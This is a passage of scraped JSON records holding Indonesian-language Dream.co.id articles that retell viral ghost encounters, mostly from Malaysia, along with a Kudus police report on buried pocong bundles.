    "story": "Menurut dokter Kamarul, pasien terakhir adalah seorang lelaki tua berusia di kisaran 50-an. Saat dokter Kamarul datang, pasien tersebut sedang tidur.\nSetelah membangunkan pasien, dokter Kamarul lantas meminta izin untuk melakukan prosedur pengambilan darah yang bersangkutan.\n\" Sewaktu aku mau sedot darah ke dalam jarum suntik, aku merasa seperti ada seseorang di sebelahku, tapi di luar tirai yang mengelilingi tempat tidur pasien.\n\" Kehadirannya mengganggu konsentrasi, sehingga aku terpaksa memberhentikan prosedur pengambilan sampel darah. Sungguh tidak nyaman,\"  kata dokter Kamarul.Untuk memastikan ada orang, dokter Kamarul pun bertanya kepada sosok misterius tersebut, \" Siapa yang berdiri di luar tirai? Ada yang bisa saya bantu?\" \nSembari berkata demikian, dokter Kamarul meletakkan jarum suntik ke dalam kidney dish di atas troli.\nNamun suasana sepi. Tidak ada jawaban sama sekali. Dokter Kamarul menoleh ke wajah pasien. Bapak itu hanya mengangkat bahu tanda tak tahu.Merasa kurang puas dan masih penasaran, dokter Kamarul punya secara tiba-tiba menyibakkan tirai dan melongok ke luar. Tetap saja tidak ada siapa-siapa di sana.\nDokter Kamarul kembali meneruskan tugasnya sehingga selesai. Tiba-tiba dia kembali merasakan ada sosok berdiri di sebelahnya. Ketika menoleh, kali ini sosok itu menampakkan wujudnya.\n\" Ya Allah! Di celah antara dua tirai, terlihat wajah yang mengintai. Hanya sebagian mukanya terlihat, selebihnya terlindung di balik tirai. Itu pun cukup ngeri sehingga adrenalin menguasai diri,\"  kata dokter Kamarul.Tiba-tiba pasien yang dari tadi diam, memanggil dokter Kamarul, \" Ada apa dokter?\" . Dokter Kamarul hanya menoleh ke pasien itu sebelum mengarahkan pandangannya lagi ke celah tirai. Makhluk itu sudah tidak ada.\nKetika mau berlalu dari tempatnya, secara tiba-tiba dokter Kamarul dikejutkan dengan teriakan pasien itu.\n\" Bapak itu bilang ada tangan dari bawah tempat tidurnya mengambil tabung-tabung darah yang sudah berisi yang berada di atas troli.\n\" Aku enggan percaya, namun tak dapat aku jelaskan ke mana hilangnya tabung-tabung itu. Padahal aku sudah mencarinya ke mana-mana, tapi tak kutemukan. 12 tabung darah itu seluruhnya hilang tanpa jejak,\"  tambah dokter Kamarul.Meski pikirannya masih dibelenggu misteri raibnya tabung-tabung itu, dia terpaksa mengulang semua proses pengambilan sampel darah pasien.\n\" Sungguh misterius! Kalau aku jelaskan apa yang terjadi, orang mungkin tak percaya. Maka, aku diamkan sahaja.\n\" Kini hanya tinggal seorang saja yang bisa mempercayai kebenaran cerita seram ini, dan akulah orang itu. Bapak pasien terakhir itu?\n\" Beliau meninggal beberapa hari setelah kejadian itu karena komplikasi demam berdarah yang parah. Kebetulan? Entahlah,\"  pungkas dokter Kamarul.\nSumber: mStar.com.my"
}, {
    "judul": "Bau Amis Diikuti Tawa, Penampakan Seram di Bawah Pohon Terekam Kamera",
    "thumb": "https://cdns.klimg.com/dream.co.id/resources/news/2020/08/21/144967/664xauto-bau-amis-diikuti-suara-tawa-pria-rekam-penampakan-seram-di-bawah-pohon-200821e.jpg",
    "desc": "\n\"Saat itulah saya lihat bayangan kabur seperti asap di area pohon bunga kamboja di depan rumah.\"\nDream - Jangankan bertemu makhluk halus, mendengar kisahnya saja terkadang orang sudah merasa seram dan takut. Seperti pria Malaysia ini yang benar-benar melihat sosok makhluk halus di depan rumah secara nyata.\nPria yang hanya dikenal sebagai Man ini melihat hantu dengan mata kepala sendiri ketika pulang kampung, untuk merayakan Iduladha di rumah mertuanya bulan kemarin.\nMengingat peristiwa seram itu, Man tidak sedikit pun menyangka akan berhadapan dengan situasi tersebut. Apalagi saat itu dia sedang bersantai di halaman rumah.\n\" Malam itu saya bersama anak lelaki saya sedang bersantai di depan rumah mertua. Waktu itu malam kedua hari raya haji... Bersantai sambil bermain media sosial,\"  katanya.\n\n",
    "story": "Saat bersantai itu, tiba-tiba suasana di halaman rumah mertuanya jadi hening. Angin berhembus sepoi-sepoi. Suasana tersebut membuat bulu kuduknya berdiri.\nPerasaan Man pun sudah tidak enak. Ketika hendak menghilangkan perasaan tersebut, Man mencium bau amis seperti ada orang yang memotong ikan.\n© Facebook Man Manz\n\" Suasana sepi itu jadi tambah menakutkan ketika saya mencium bau amis. Lebih menyeramkan lagi saya mendengar suara perempuan sedang tertawa,\"  katanya.\nMan berusaha mengabaikan apa yang dia alami itu. Saat itu dia hanya berpikir kejadian-kejadian itu mungkin datang dari rumah tetangga mertua.\nTetapi, semakin dia berusaha tidak peduli, gangguan aneh itu semakin menjadi-jadi. Sampai suara tertawa itu berganti menjadi tangisan terisak-isak.\n\" Sayup saja suaranya karena hembusan angin yang lumayan kuat. Saat itulah saya lihat bayangan kabur seperti asap di area pohon bunga kamboja di depan rumah,\"  kata Man.Man mengatakan bayangan itu semakin berani menunjukkan dirinya dengan jelas di balik pohon kamboja tersebut.\nDia kemudian memberanikan diri untuk berdiri di dekat pagar rumah dan merekam sosok menyeramkan itu.\nNamun, meski berhasil mendapatkan beberapa foto dan video makhluk tersebut, Man merasa hasilnya kabur. Padahal dia sudah menyetel fokus kamera ponselnya.\n\" Anehnya, kamera ponsel saya tidak mau fokus. Saya tunggu makhluk itu tidak muncul. Tapi ketika saya mau duduk di teras rumah, dia muncul lagi,\"  katanya.\nMan pun cepat-cepat bangkit dan merekam makhluk itu meski dengan perasaan antara terkejut dan takut.\n© Facebook Man Manz\nSaat berhasil mengambil gambar makhluk itu dengan lumayan jelas, Man sangat terkejut dengan hasilnya.\n© Facebook Man Manz\nSosok itu berwajah buruk dan pucat, serta memakai baju lusuh bercampur tanah. Rambutnya panjang namun tidak punya mulut.Yang lebih mengherankan Man saat dia mencoba memperbesar tampilan video saat merekam, zoom kamera ponselnya tiba-tiba tak berfungsi.\n\" Saat saya perbesar lagi, gambarnya pecah. Entah kenapa, sementara video lain yang saya rekam di malam hari, kualitasnya bagus,\"  katanya.\nTidak berhenti sampai disitu, Man mengatakan makhluk itu juga memutar kepala 360 derajat sambil menatap ke arahnya. Man pun mulai merasa benar-benar ketakutan.\n\" Saya terus menguatkan semangat sembari mulut saya terus bergerak untuk membaca ayat dan surah Alquran.\n\" Makhluk itu menatap saya, membuat saya merinding dan merasa kaki ini tidak menginjak lantai. Jantung saya berdebar kencang, seperti orang baru habis lari,\"  kenangnya.\nSumber: mStar.com.my"
}, {
    "judul": "Terungkap Sosok Yulia Fera Ayu di Kertas Pocong yang Viral",
    "thumb": "https://cdns.klimg.com/dream.co.id/resources/news/2020/06/23/140016/664xauto-terungkap-sososk-yulia-fera-ayu-di-kertas-pocongan-yang-viral-2006230.jpg",
    "desc": "\nMashuri mengatakan, perempuan yang disapa Ayu tersebut, dulu sempat berjualan di Terminal Wisata Bakalan Krapyak bersama ayahnya yang bernama Junaedi.\nDream - Pemilik nama Yulia Fera Ayu Lestari akhirnya terkuak. Nama itu sebelumnya tertera pada kertas yang ditemukan terbungkus sejumlah pocong.\nPosong-pocong yang menghebohkan warga itu ditemukan di Makam Muslim Sedioluhur Krapyak. Selain kertas, ada pula jarum di dalam pocong yang dikubur di atas pusara tersebut.\nditemukan  sempat membuat geger warga dan jagat media sosial. Dalam poconga tersebut, tersimpat secarik kertas bertuliskan Yulia Fera Ayu Lestari. Lalu, siapakah sosok tersebut?\nSetelah ditelusuri, ternyata Yulia Fera Ayu Lestari merupakan salah satu warga Desa Karangmalang, Gebog, Kudus, Jawa Tengah. Kepala Desa Karangmalang, Mashuri, membenarkan informasi tersebut.\n\n",
    "story": "Mashuri mengatakan, perempuan yang disapa Ayu tersebut dulu sempat berjualan di Terminal Wisata Bakalan Krapyak bersama ayahnya, Junaedi. Orang tua Ayu, tambah dia, telah pisah. Sang ayah telah menikah lagi.\nMenurut Mashuri, sehari-hari Ayu jarang di rumah. Dia sering keluar bersama anak-anak punk. Saat berada di rumah, Ayu termasuk warga yang tertutup. Tak jarang, di rumahnya ramai ketika malam hari ketika teman-temannya datang.\nTerkait dugaan pelet kepada Ayu yang sempat beredar, Mashuri menduga hanya perbuatan iseng. Kesimpulan ini diambil lantaran dalam kesehariannya memang Ayu sering bergaul dengan anak punk.\" Kalau malam anak-anak punk berkumpul. Kadang kami mengurainya dengan meminta mereka pulang,\"  jelasnya.\nSementara saat dicek ke rumahnya, Ayu tidak sedang di rumah. Di rumahnya, ada seorang kakek yang berjualan bensin di depan rumah.\n\" Mbak Ayu (panggilan Yulia Fera) sedang tidak di rumah. Jarang pulang. Saya tidak tahu kalau ada ramai-ramai,\"  kata Samian, kakek Yulia Fera Ayu Lestari.\nSumber: Radar KudusDream - Warga Kudus, Jawa Tengah, digegerkan penemuan sembilan bungkusan menyerupai pocong. Bungkusan tersebut terkubur di pemakaman Desa Bakalan Krapyak, Kecamatan Kaliwungu.\nKasat Reskrim Polres Kudus, AKP Agustinus David, membenarkan kabar tersebut. Bersama sejumlah warga, pihaknya melakukan penggalian di lokasi penguburan sembilan bungkusan tersebut.\n\"  Setelah kami bongkar dari dua makam di Pemakaman Desa Bakalan Krapyak Kamis malam (18 Juni 2020), ternyata sembilan bungkusan berbentuk pocong berisi bangkai ayam,\"  ujar Agustinus, dikutip dari Liputan6.com dari Kantor Berita Antara.\nDia menduga bangkai ayam tersebut digunakan sebagai ritual ilmu hitam. Sebab, ditemukan benda lain dalam bungkusan tersebut yaitu foto wanita, jarum, dan kertas berisi tulisa yang diduga mantra.\nAgustinus  menyatakan kepolisian masih melakukan penyelidikan untuk mengungkap adanya unsur pidana dalam temuan tersebut. Juga untuk mengungkap motif pelaku.Sembilan bungkusan berisi bangkai ayam itu ditemukan terkubur persis di atas dua makam. Bungkusan yang sempat diduga berisi mayat bayi itu awalnya ditemukan seorang warga yang hendak berziarah ke makan orangtuanya pada Kamis sore sekitar puku 16.30 WIB.\nPeziarah diketahui bernama Muhammad Kafid asal Desa Daren, Kabupaten Jepara, itu sempat curiga ketika melihat makam ibunya. Sebab, ada tumpukan tanah bekas galian baru di makam tersebut.\n\"  Saya sempat curiga dengan kondisi makam orang tua saya, karena tanahnya terdapat timbunan baru,\"  kata Kafid.\nSelain itu, ada banyak lalat di sekitar makam orangtuanya yang baru berumur 100 hari. Kafid pun memberanikan diri membongkar tanah urukan tersebut dan menemukan bungkusan kain kafan dengan bentuk menyerupai jenazah bayi.\nDia lalu melaporkan hal itu ke penjaga makam. Tetapi, penjaga makam mengaku tidak tahu ada kejadian tersebut.\nSetelah itu, Kafid melaporkan temuanya ke perangkat desa setempat, lalu diteruskan ke kepolisian. Beberapa saat kemudian, sejumlah aparat kepolisian tiba dan melakukan penggalian bersama warga.\n(Sumber: Liputan6.com)"
}, {
    "judul": "Lewat Jalan Angker Tengah Malam, Pria Ini Bertemu Rombongan Pengusung Keranda",
    "thumb": "https://cdns.klimg.com/dream.co.id/resources/news/2020/10/15/149778/664xauto-lewat-jalan-angker-tengah-malam-pria-bertemu-rombongan-pengusung-keranda-2010157.jpg",
    "desc": "\nNamun ketika diperhatikan, tak satu pun yang bawa penerangan untuk mengiringi keranda ke kuburan.\nDream - Sudah hampir setahun Zack terpaksa berjauhan dengan keluarga setelah dipindah ke cabang perusahaannya di Taiping, Perak, Malaysia, karena kenaikan jabatan.\nMeskipun berjauhan, Zack tidak pernah melupakan tanggungjawab terhadap istri serta anak-anaknya. Dia akan pulang ke Baling, Kedah, setiap akhir pekan.\nNamun dia mengakui perjalanan dari Taiping ke Baling memang melelahkan. Apalagi jika harus pulang dan pergi setiap pekan.\nJadi, untuk menghemat waktu dan bahan bakar, Zack mengambil keputusan untuk menggunakan jalan pintas. Dari sinilah satu kejadian yang menyeramkan terjadi kepadanya.\n\n",
    "story": "Cerita berawal saat Zack bertanya kemungkinan ada jalan pintas jika mau pulang dari Taiping ke Baling. Rekan-rekannya mengatakan ada jalan pintas, tapi melewati jalan kampung.\nTapi jalan kampung ini agak berbahaya pada waktu malam. Apalagi jalan tersebut berada dekat kawasan hutan. Takutnya hewan liar seperti babi hutan atau tapir melintas.\nBelum lagi ada beberapa hewan ternak seperti kerbau dan juga sapi yang suka tidur di atas jalan yang biasanya dilewati kendaraan.\n\" Kata rekan-rekan, jalan pintas itu memang cepat tapi berbahaya kalau menyetir waktu malam. Kata mereka, berbagai kejadian aneh akan terjadi.\n\" Mereka bilang saya lebih baik menggunakan jalan raya seperti biasa atau jika pakai jalan kampung, menyetir pada waktu terang saja,\"  katanya.Mendengar nasihat rekan-rekannya, Zack berangkat ke Kedah saat pagi melalui jalan pintas. Melewati Kamunting, Zack menuju ke Pondok Tanjung sebelum menyusuri Selama di Perak.\nDari Selama, dia masuk Kedah yang berbatasan dengan daerah menuju ke Mahang, Karangan dan seterusnya Kuala Ketil sebelum sampai daerah Baling.\nPerjalanan pada waktu pagi itu berjalan lancar meskipun jalannya agak berbahaya. Selain banyak belokan tajam, monyet juga berkeliaran sepanjang jalan.\n\" Namun perjalanan agak tenang karena pemandangan dipenuhi dengan pohon kelapa sawit sepanjang perjalanan,\"  ujarnya.Lama-kelamaan Zack mulai terbiasa dengan jalan pintas lewat Pondok Tanjung tersebut. Dia pun percaya diri untuk balik ke Taiping pada waktu malam menggunakan jalan yang sama.\nKebetulan ketika itu Zack terpaksa balik ke Taiping lewat malam karena harus menghadiri undangan di Baling. Ternyata tindakan itu satu keputusan yang salah.\n\" Pada awalnya perjalanan lancar sampai saya tiba di Pondok Tanjung. Saat itu kurang lebih 30 minit untuk sampai ke Taiping. Jam ketika itu sudah menunjukkan pukul 2 pagi.\n\" Entah kenapa saya rasa seram tetapi saya teruskan perjalanan seperti biasa sebelum saya lihat ada banyak orang sedang berjalan kaki di tengah jalan raya,\"  jelasnya.Pada mulanya Zack tidak menaruh curiga atau merasa aneh karena rombongan itu dalam jumlah yang banyak. Saat Zack terpaksa melambatkan kendaraan karena orang-orang itu berjalan di tengah jalan raya.\n\" Bayangkan dalam gelap itu, pukul dua pagi, mereka berjalan kaki beramai-ramai. Saya sampai terpaksa lambatkan mobil dan matikan lampu jauh yang saya gunakan sebelumnya,\"  katanya.\nZack tidak melihat ada celah untuk mendahului rombongan tersebut karena jumlahnya amat banyak. Dia pun ambil keputusan untuk mengikuti mereka perlahan-lahan dari belakang.\nNamun, beberapa menit mengikuti dari belakang, Zack mulai merasa aneh. Di benaknya muncul pertanyaan kenapa begitu banyak orang pada waktu itu di jalan raya?Kata Zack, dia memberanikan diri dengan memberhentikan mobil di tepi jalan sebelum menyalakan lagi lampu jauh. Begitu melayangkan pandangan ke arah rombongan itu, dia melihat mereka sedang mengusung keranda jenazah.\nDarahnya mula berdesir, sementara otaknya baru menyadari bahwa semua orang dalam rombongan itu tak ada satu pun yang membawa lampu senter atau penerangan lainnya untuk mengiringi jenazah ke kawasan perkuburan.\n\" Saya masih berpikiran positif dan kembali mengikut rombongan itu dari belakang. Meski dapat penerangan dari mobil saya, tak seorang pun dari rombongan pengusung keranda itu yang menoleh ke arah saya.\n\" Justru saya yang mulai ketakutan. Saya menoleh ke kiri dan ke kanan, dan baru sadar semuanya adalah kawasan hutan! Mana ada rumah di kawasan seperti ini?\n\" Dengan jantung berdebar dan ketakutan, saya langsung melaju kencang dan mencoba lewat bahu jalan untuk mendahului rombongan aneh itu. Saya sudah tak pandang kiri kanan lagi dah,\"  ceritanya.Sampai di Taiping, Zack langsung mengunci diri dalam kamar namun tidak dapat memejamkan mata karena merasa terganggu dengan kejadian itu.\nKeesokan harinya, Zack mengalami demam selama beberapa hari. Sejak itu dia tidak lagi berani menggunakan jalan itu pada waktu malam.\nMenurut cerita orang lama, banyak kejadian aneh pada waktu malam berlaku di Pondok Tanjung yang dikelilingi kawasan hutan.\nPada waktu siang kawasan itu banyak dipenuhi monyet yang menanti makanan dari pengguna jalan yang lewat. Pada waktu malam wilayah tersebut merupakan kawasan perkampungan orang Bunian.\nJadi, tidak mengherankan siapa pun yang melalui kawasan itu pada tengah malam, jika nasib kurang baik akan berjumpa dengan macam-macam penampakan.\nDi antara penampakan yang kerap menjadi perbincangan orang adalah bertemu rombongan orang mengusung keranda atau ibu berjalan dengan dua anak. Terkadang mendengar ada banyak orang sedang mandi di anak sungai di kawasan itu.\nPernah juga terjadi seorang penunggang motor nyaris jatuh ke jurang. Saat masih jauh, lampu motornya menunjukkan jalan itu lurus. Tapi apabila sudah dekat, ternyata ada belokan tajam.\nPenunggang motor itu bernasib baik karena pada waktu kejadian, kira-kira pukul 11 malam, dia tidak menunggang motor dengan kencang.\nSumber: mStar.com.my"
}, {
    "judul": "Cerita Liburan Seram, Diganggu Bunyi-bunyi Misterius Sepanjang Malam",
    "thumb": "https://cdns.klimg.com/dream.co.id/resources/news/2021/01/21/158119/664xauto-cerita-liburan-seram-diganggu-bunyi-bunyi-misterius-sepanjang-malam-210121z.jpg",
    "desc": "\nGangguan makhluk halus itu datang silih berganti.\nDream - Kita bukan satu-satunya penghuni dunia ini. Ada juga makhluk lain yang menemani, hanya saja kita tidak menyadarinya.\nSebagai Muslim, kita harus percaya pada hal gaib karena itu adalah bagian dari rukun iman. Namun, hanya kepada Allah kita pantas takut karena Dia yang mengendalikan segalanya.\nBaru-baru ini, seorang wanita Malaysia berbagi pengalaman menyeramkan saat berlibur di sebuah resort ternama di Malaysia.\nMelalui grup Facebook Kelab Cerita Hantu Malaysia, Siti Nazurah Abd Moin mengawali kisahnya ketika dia dan keluarga memutuskan menyewa sebuah homestay.\n\n",
    "story": "Rumah tersebut memiliki 3 kamar tidur. Tapi seperti biasanya, semuanya berukuran besar. Masing-masing memiliki 2 ranjang besar dan kamar mandi di dalam.\nKarena keluarga yang ikut hanya 5 orang termasuk dirinya, hanya kamar pertama yang terpakai. Sementara kamar 2 dan 3 dibiarkan tetap kosong.\nMalam itu, sekitar jam 9, Siti menyuruh ketiga anaknya tidur terlebih dahulu karena besok mereka bangun pagi-pagi melanjutkan perjalanan.\nSementara anak-anak tidur, Siti beres-beres dapur dan meja makan. Sebelumnya dia memang memasak dan makan malam bersama dengan keluarganya.Mungkin karena kelelahan, anak pertama dan kedua langsung tertidur. Sedangkan anak bungsunya keluar kamar, dan bilang ada hantu sambil tertawa.\nSiti awalnya tidak ambil pusing dengan ucapan anaknya itu karena dikenal suka bercanda dan sedikit hiperaktif.\nSekitar jam 11.30 malam, Siti masuk kamar, diikuti oleh anak bungsunya. Siti, suami, dan anak bungsunya tidur di satu ranjang. Sementara dua anaknya yang lain tidur di ranjang satunya.\nTak lama kemudian, si bungsu sudah tertidur. Tinggal Siti yang dari tadi masih belum bisa memejamkan mata.\nSaat berusaha tidur itulah, Siti tiba-tiba mendengar suara kursi di luar kamar diseret ke sana sini.\nBunyi suara kursi diseret tersebut sangat jelas. Suasana jadi sepi dan seram. Apalagi di luar hujan rintik-rintik.Awalnya Siti menganggap itu hanya perasaan saja karena seharian ini dia merasa lelah. Dia pun berusaha memejamkan mata.\nTapi itulah permulaan malam yang seram dan panjang, yang baru kali ini dialami sendiri oleh Siti.\n\" Suara menyeret kursi tersebut semakin keras, seperti orang memindahkan perabot. Untungnya, suami ada di sebelah, jadi rasa takut bisa sedikit terkontrol.\n\" Saya memaksakan diri untuk tidur begitu mendengar seperti ada orang bermain di pasir. Kali ini suaranya terdengar tepat di langit-langit di atas kepala tempat tidur kami,\"  kata Siti.\nSaat muncul suara orang bermain pasir itu, suaminya sempat bangun sebelum kembali tidur. Siti maklum karena suaminya mungkin penat karena lelah mengemudikan mobil.Di saat suara pasir dan kursi diseret terdengar bergantian, tiba-tiba muncul suara kelereng dijatuhkan ke lantai dari tempat tinggi.\n\" Saya langsung meremang. Meski badan letih dan mengantuk tapi mata dan pikiran saya tak bisa diajak tidur karena mendengar bunyi-bunyian misterius itu,\"  imbuh Siti.\nHingga jam 2.30 pagi, Siti tak bisa tidur diganggu bunyi-bunyian di dalam homestay tersebut.\nSiti pun berusaha menenangkan dirinya dengan membaca ayat Kursi sambil terpejam, berharap akhirnya bisa tertidur lelap.\n\" Waktu seakan berjalan sangat lambat, sementara bunyi-bunyian itu terus bermunculan secara bergantian,\"  kata Siti.Namun yang membuat Siti sangat ketakutan adalah bunyi orang menyiram toliet yang ada di kamar mandi dalam.\n\" Saat itu saya benar-benar menggigil ketakutan. Mata tertutup rapat tapi telinga mendengar pintu kamar mandi di dalam terbuka sendiri.\n\" Setelah itu saya mendengar toliet disiram seperti ada orang baru memakainya. Jantung ini berdebar kencang, cerita-cerita horor langsung muncul di pikiran,\"  katanya.\nLama-lama Siti akhirnya tertidur juga walau bunyi-bunyian itu masih terus ada. Itupun tidur-tidur ayam karena Siti terbangun pukul 5 pagi.\nDalam hati dia bersyukur anak-anak bisa tidur dengan nyenyak. Bayangkan kalau mereka juga ikut mendengar apa dialami Siti. Dia tak tahu harus bagaimana mengatasi perasaan takut anak-anaknya.\n\" Saya yakin bunyi-bunyi aneh di malam itu bukan perasaan saya saja, sebab saya tak punya bayangan seram sebelumnya saat memutuskan menginap di rumah itu,\"  kataya.Siti kemudian membangunkan keluarganya untuk sholat Subuh sebelum dia keluar dari kamar. Tidak ada perubahan apa pun dari semalam dia masuk ke kamar.\n\" Semua perabot tetap di tempatnya, tak ada satu pun yang berpindah. Saya kira 'makhluk' itu mau bantu menata perabot yang ada supaya dekorasinya jadi lebih menarik,\"  kata Siti sambil bercanda.\nSaat dalam perjalanan pulang, Siti bercerita tentang pengalaman seramnya kepada suami. Ternyata suaminya juga mendengar gangguan tersebut tapi lebih memilih tidur karena sudah lelah.\nSuami Siti bilang gangguan itu muncul karena makhluk halus di rumah itu mungkin hanya ingin memberitahu bahwa ia ada.\n\" Gurauan manja dari 'si dia' sebagai salam perkenalan. Sebab kawasan itu dulu mungkin hutan atau apa. Kita juga tidak tahu,\"  kata Siti menirukan ucapan sang suami.\nDari kisah horornya itu, Siti tetap bersyukur karena tidak ada hal yang serius atau terlalu menakutkan yang terjadi kepadanya.\nSumber: Siakapkeli.my"
}, {
    "judul": "Video Boomerang Tak Sengaja Rekam Sosok Tanpa Kepala, Editan?",
    "thumb": "https://cdns.klimg.com/dream.co.id/resources/news/2019/10/09/119547/664xauto-seram-video-boomerang-tak-sengaja-rekam-hantu-tanpa-kepala-191009l.jpg",
    "desc": "\nTanpa diduga, muncul sosok pria memakai baju warna merah dan bawahan hitam di latar belakang.\nDream - Tidak dipungkiri lagi jika kehidupan di dunia ini tidak lepas dari hal-hal mistis atau gaib yang tentu menakutkan bagi sebagian orang. Ada yang percaya jika mahluk dunia lain bisa menampakkan wujudnya. Banyak juga yang meragukannya.\nApalagi di tengah serbuan media sosial yang sekadar mencari sensasi seperti saat ini. Konten bertema horor menjadi jaminan unggahan bakal viral.\nKali ini penampakan sosok diklaim makhluk gaib muncul lewat sebuah postingan seorang wanita Malaysia bernama Erina Zibidan. Dia membagikan pengalaman yang bikin bulu kuduk berdiri ketika membuat video Boomerang di Whatsapp.\nDalam video itu, Erina berpose dengan berdiri di tengah lorong sebuah hotel. Dengan baju pink dan bawahan putih, gadis berjilbab itu terus mengatur posenya.\nSesekali dia mengangkat tangan untuk membetulkan letak jilbab yang sewarna dengan celana yang dipakainya\n\n",
    "story": "Namun tanpa disadari oleh Erina, muncul sosok pria memakai baju warna merah dan bawahan hitam di latar belakang.\n© Video Boomerang Erina Zibidan\nPria yang diduga pegawai hotel itu terlihat berjalan sambil membawa baki di tangannya.\nTetapi yang paling mengejutkan adalah pegawai hotel itu tidak memiliki kepala. Erina yang menerima cuplikan gambar video Boomerang tersebut ikut terkejut.\n© Video Boomerang Erina Zibidan\nErina tak menyangka video Boomerang yang dibuatnya bisa merekam sosok yang cukup mengerikan. Apalagi saat itu dia berada dekat dengan sosok menyeramkan tersebut.Sayangnya, sebagian netizen tidak terkejut atau merasa bergidik melihat cuplikan gambar dari video Boomerang Erina itu.\nMereka menganggap bahwa cuplikan gambar dari video Boomerang Erina itu sudah diedit terlebih dahulu sebelum dikirim kepadanya.\n© Video Boomerang Erina Zibidan\n\" Kalau dilihat betul-betul, seperti sudah diedit. Di-sketch dengan warna yang sama dengan dinding. Coba lihat lagi dengan teliti,\"  tulis Mohamad Syukri.\nSementara yang lain mengatakan bahwa kepala pegawai hotel itu ditutup dengan warna yang senada dengan dinding.\n© Video Boomerang Erina Zibidan\n\" Digambar sama dengan warna dinding. Tampak dindingnya sangat kabur. Tidak profesional huuuu.. Next,\"  tulis Aleeya Ahmad.\n© Video Boomerang Erina Zibidan\n\" Editan... dia gambar pakai warna dinding... tampak kentara sekali pada gambar, ada bekasnya,\"  tulis Ahmad Amierrudin.\n(Sah, Sumber: Siakapkeli.my)"
}, {
    "judul": "Merinding, Ayunan di Taman Ini Bergerak Sendiri di Siang Bolong",
    "thumb": "https://cdns.klimg.com/dream.co.id/resources/news/2019/10/04/119239/664xauto-merinding-ayunan-di-taman-ini-gerak-sendiri-di-siang-bolong-191004a.jpg",
    "desc": "\nBenar-benar membuat bulu kuduk makin merinding.\nDream - Cerita-cerita horor selalu menarik perhatian karena berkaitan dengan kehidupan sehari-hari.\nApalagi jika cerita horor itu dibumbui unsur mistik yang membuat kita semakin merinding dan ketakutan.\nSelama ini, kejadian horor selalu berlangsung malam hari. Namun cerita horor di Malaysia ini justru terjadi pada siang hari bolong.\nCerita benda bisa bergerak sendiri tersebut menyita perhatian. Benar-benar membuat bulu kuduk makin merinding.\n\n",
    "story": "Sebuah video viral yang direkam oleh seorang perempuan Malaysia dan dibagikan di Facebook oleh Arenom Roslie membuat netizen ketakutan.\nBagaimana tidak? Dalam video itu tampak ayunan di taman bermain bergerak sendiri di siang hari bolong.\nTidak ada siapapun yang terlihat menggerakkan ayunan tersebut. Menurut perempuan itu, insiden tersebut terjadi pada pukul 12:15 siang.\nSaat sedang menjawab pesan Whatsapp, dia melihat kejadian tersebut. Setelah merekamnya, dia kemudian mengirimkan video itu ke temannya.\nPada saat yang sama, dia dan anak-anaknya sedang berada di dalam mobil menunggu suaminya.Kata dia, sungguh aneh jika ayunan di taman tersebut bisa bergerak sendiri tanpa ada angin atau orang. Apalagi di tengah panas yang terik.\nDia menduga ada makhluk halus yang tak kasat mata yang menggerakkan ayunan di dalam taman itu.\n\" Di dunia ini, bukan hanya manusia, hewan dan tumbuhan yang menumpang hidup. Ada (makhluk) yang tak tampak mata juga. Sebab semua ini adalah makhluk Allah juga,\"  katanya.\nDia mengaku sudah beberapa kali menghadapi kejadian mistik seperti ayunan yang bergerak sendiri di taman itu.\nSumber: Siakapkeli.myLihat video di bawah ini:Dream - Sebelumnya Malaysia dikejutkan oleh sosok seram seorang wanita berkebaya merah yang berjalan malam-malam sendirian di tepi jalan.\nKini muncul lagi video yang tak kalah menghebohkan warga negeri jiran itu. Video itu menunjukkan sosok berpakaian putih dan berambut panjang di taman bermain.\nTak jelas sosok apa yang terekam kamera tersebut. Bisa jadi sosok itu adalah orang yang berdandan seperti hantu kuntilanak. Namun yang jelas, banyak orang bergidik saat melihat video itu.\nDalam video berdurasi 25 detik yang diposting pada tanggal 28 Maret itu terlihat ayunan di taman bermain Kompleks Perumahan Bomba Kempas di Johor bergerak dengan sendirinya.\nSementara di sampingnya terlihat sosok berpakaian putih dan berambut panjang berdiri memperhatikan ayunan yang bergerak sendiri itu.\nAnehnya kejadian yang cukup menyeramkan itu direkam pada siang hari bolong. Menurut keterangan warga sekitar perumahan mereka juga pernah mengalami kejadian aneh di malam hari.\nWarga menambahkan, kawasan tersebut baru saja direnovasi dan dihuni pada bulan Maret lalu.\nSementara itu, Pejabat Humas Divisi Pemadam Kebakaran dan Keselamatan Johor, Muhamad Riduan Akhya, mengatakan, masalah gangguan makhluk itu tidak pernah dilaporkan.\nMenurut Riduan, warga perumahan banyak yang baru pindah ke rumah mereka masing-masing awal Maret.\nRiduan menambahkan, sejak video wanita yang menyerupai kuntilanak itu viral, ia mengambil tindakan dengan menggelar tahlil dan membaca Yaasin pada hari Minggu kemarin.\n\" Kami telah melakukan pengobatan tradisional dan menggelar tahlil serta membaca Yaasin pada hari Minggu. Bagi kami, ini bukan masalah serius dan kemungkinan itu hanya kebetulan dilihat oleh penghuni pada waktu itu,\"  kata Riduan.\nKatanya lagi, selama ini anak-anak penghuni kompleks perumahan bermain di taman bermain itu seperti biasa, tidak ada hal-hal aneh yang terjadi.\nRiduan menambahkan, sebagai umat Islam, kita memang wajib percaya makhluk halus. Tapi pendekatan tradisional dan Islam tetap harus dilakukan untuk menjaga keharmonisan penghuni kompleks perumahan.\n  \n(Sumber: mynewshub.cc)Dream - Rekaman video di sebuah rumah sakit di Amerika ini sungguh menyeramkan. Banyak orang yang melihat menjadi ketakutan karena yakin video tersebut bukan hasil editan.\nVideo itu merekam detik-detik peristiwa horor yang dialami oleh seorang penjaga rumah sakit.\nDia mengaku melihat langsung sebuah kursi roda yang bergerak secara misterius.\nPadahal saat itu kondisi lorong tempat kursi roda itu berada tidak ada orang lain selain dirinya yang sedang patroli.\nDilansir dari akun Twitter @TerrifyingPixs, kejadian bermula saat petugas itu mulai berpatroli mengelilingi rumah sakit.\nSaat melewati salah satu lorong, petugas itu yakin melihat sebuah kursi roda yang tergeletak di dinding.\nNamun ketika ia melakukan patroli keduanya dan kembali melewati lorong tersebut, ia dibuat kaget karena posisi kursi roda tadi telah berpindah.\nPadahal seharusnya tidak aktivitas orang lain pada lorong tersebut. Akhirnya petugas keamanan tersebut merekam kursi roda.\nUsai beberapa detik direkam, hal yang ditakutkan pun terjadi.\nKursi roda tersebut bergerak sendiri. Apesnya, pergerakan kursi roda itu malah mengarah ke arahnya.\nAkhirnya pria ini memutuskan untuk ambil langkah seribu dari lorong tersebut.\n\" Pada patroli pertama kursi posisi kursi ini ada di seberang. Namun pada patroli kedua, ini yang aku temukan. Ini adalah pengalaman seram pertama yang pernah aku alami,\"  